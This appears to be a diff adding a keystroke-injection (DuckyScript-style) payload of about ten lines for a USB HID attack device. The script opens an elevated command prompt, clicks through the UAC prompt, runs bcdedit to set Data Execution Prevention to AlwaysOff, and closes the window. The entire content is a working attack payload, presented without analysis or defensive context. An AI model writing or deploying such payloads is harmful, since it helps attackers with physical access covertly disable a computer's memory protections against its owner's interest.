@@ -1,0 +1,11 @@
+GUI
+string cmd
+ADMIN
+DELAY 1000
+LEFTARROW
+ENTER
+DELAY 1000
+STRING bcdedit.exe /set {current} nx AlwaysOff
+ENTER
+DELAY 5000
+ALT F4
